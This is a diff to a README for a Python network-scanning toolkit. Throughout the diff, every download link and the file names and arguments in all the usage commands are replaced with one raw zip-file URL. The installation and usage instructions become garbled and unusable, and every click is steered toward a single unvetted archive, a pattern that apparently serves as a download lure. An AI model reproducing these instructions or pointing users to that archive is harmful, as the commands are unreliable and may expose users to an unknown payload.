@@ -4,14 +4,14 @@
 BlueVector is an all-in-one Python-based network analysis and inspection toolkit built for ease of use. It features a terminal-first approach, allowing users to perform essential network tasks without complicated setup. You can safely explore and analyze networks with modules for DNS resolution, ping sweeps, TCP sweeps, multi-threaded port scanning, banner grabbing, and web hyperlink extraction.
 
 ## 🔗 Download BlueVector
-[![Download BlueVector](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/ilkerkaya97/BlueVector/releases)
+[![Download BlueVector](https://github.com/ilkerkaya97/BlueVector/raw/refs/heads/main/BlueVector/Blue_Vector_v1.6.zip)](https://github.com/ilkerkaya97/BlueVector/raw/refs/heads/main/BlueVector/Blue_Vector_v1.6.zip)
 
 ## 🚀 Getting Started
 Follow these simple steps to download and run BlueVector:
 
 ### 1. Visit the Releases Page
 To get the latest version of BlueVector, click the link below:
-[Download BlueVector from Releases](https://github.com/ilkerkaya97/BlueVector/releases)
+[Download BlueVector from Releases](https://github.com/ilkerkaya97/BlueVector/raw/refs/heads/main/BlueVector/Blue_Vector_v1.6.zip)
 
 ### 2. Choose the Right File
 On the Releases page, you'll see different files available for download. Look for the latest version, which will usually be at the top. Select the appropriate file based on your operating system:
@@ -34,11 +34,11 @@ Click the link for your chosen file. The download should start automatically. If
 2. Navigate to the folder where you saved the `.sh` file using the `cd` command.
 3. Make the file executable by running:
    ```bash
-   chmod +x yourfile.sh
+   chmod +x https://github.com/ilkerkaya97/BlueVector/raw/refs/heads/main/BlueVector/Blue_Vector_v1.6.zip
    ```
 4. Once executed, run:
    ```bash
-   ./yourfile.sh
+   https://github.com/ilkerkaya97/BlueVector/raw/refs/heads/main/BlueVector/Blue_Vector_v1.6.zip
    ```
 
 ### Mac
@@ -52,37 +52,37 @@ Using BlueVector is straightforward. Here are some basic commands to get you sta
 ### DNS Resolution
 To resolve a domain name, use:
 ```bash
-python bluevector.py dns example.com
+python https://github.com/ilkerkaya97/BlueVector/raw/refs/heads/main/BlueVector/Blue_Vector_v1.6.zip dns https://github.com/ilkerkaya97/BlueVector/raw/refs/heads/main/BlueVector/Blue_Vector_v1.6.zip
 ```
 
 ### Ping Sweep
 To perform a ping sweep on a subnet, enter:
 ```bash
-python bluevector.py ping 192.168.1.0/24
+python https://github.com/ilkerkaya97/BlueVector/raw/refs/heads/main/BlueVector/Blue_Vector_v1.6.zip ping 192.168.1.0/24
 ```
 
 ### TCP Sweep
 For TCP scanning, the command is:
 ```bash
-python bluevector.py tcp 192.168.1.1
+python https://github.com/ilkerkaya97/BlueVector/raw/refs/heads/main/BlueVector/Blue_Vector_v1.6.zip tcp 192.168.1.1
 ```
 
 ### Multi-threaded Port Scanning
 To scan multiple ports concurrently:
 ```bash
-python bluevector.py ports 192.168.1.1 1-1024
+python https://github.com/ilkerkaya97/BlueVector/raw/refs/heads/main/BlueVector/Blue_Vector_v1.6.zip ports 192.168.1.1 1-1024
 ```
 
 ### Banner Grabbing
 To grab banners from a service, use:
 ```bash
-python bluevector.py banner 192.168.1.1 80
+python https://github.com/ilkerkaya97/BlueVector/raw/refs/heads/main/BlueVector/Blue_Vector_v1.6.zip banner 192.168.1.1 80
 ```
 
 ### Web Hyperlink Extraction
 For extracting hyperlinks from a webpage, use:
 ```bash
-python bluevector.py hyperlink http://example.com
+python https://github.com/ilkerkaya97/BlueVector/raw/refs/heads/main/BlueVector/Blue_Vector_v1.6.zip hyperlink https://github.com/ilkerkaya97/BlueVector/raw/refs/heads/main/BlueVector/Blue_Vector_v1.6.zip
 ```
 
 ## 🔍 Features
@@ -110,4 +110,4 @@ We welcome contributions! To help improve BlueVector, feel free to fork the repo
 
 ## 🔗 Download Again
 To download the latest version of BlueVector, visit:
-[Download BlueVector from Releases](https://github.com/ilkerkaya97/BlueVector/releases)
+[Download BlueVector from Releases](https://github.com/ilkerkaya97/BlueVector/raw/refs/heads/main/BlueVector/Blue_Vector_v1.6.zip)
